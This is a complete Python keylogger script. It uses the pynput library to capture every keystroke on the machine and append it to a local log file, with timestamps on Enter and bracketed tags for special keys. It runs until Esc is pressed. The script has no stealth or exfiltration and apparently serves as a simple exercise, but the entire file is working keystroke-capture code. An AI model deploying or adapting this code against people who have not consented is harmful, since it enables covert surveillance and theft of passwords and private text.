from pynput.keyboard import Key, Listener
import datetime

LOG_FILE = "../test.txt"

def on_press(key):

    try:
        with open(LOG_FILE, "a") as log_file_handle:
            log_file_handle.write(key.char)
    except AttributeError:
        with open(LOG_FILE, "a") as log_file_handle:
            if key == Key.space:
                # If the spacebar is pressed, log a space.
                log_file_handle.write(" ")
            elif key == Key.enter:
                # If the enter key is pressed, log a newline character, the timestamp, and [enter].
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                log_file_handle.write(f"\n[{timestamp}] [enter]\n")
            elif key == Key.backspace:
                # If the backspace key is pressed, log [backspace].
                log_file_handle.write(" [backspace] ")
            elif key == Key.tab:
                # If the tab key is pressed, log [tab].
                log_file_handle.write(" [tab] ")
            elif key == Key.shift or key == Key.shift_r or key == Key.shift_l:
                # If the shift key is pressed, log [shift].
                log_file_handle.write(" [shift] ")
            elif key == Key.ctrl or key == Key.ctrl_r or key == Key.ctrl_l:
                # If the ctrl key is pressed, log [ctrl].
                log_file_handle.write(" [ctrl] ")
            elif key == Key.alt or key == Key.alt_r or key == Key.alt_l:
                # If the alt key is pressed, log [alt].
                log_file_handle.write(" [alt] ")
            else:
                # For other special keys (e.g., esc), log their name.
                # We add brackets around the key name to distinguish them from regular characters.
                log_file_handle.write(f" [{key}] ")

def on_release(key):
    if key == Key.esc:
        return False

def main():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
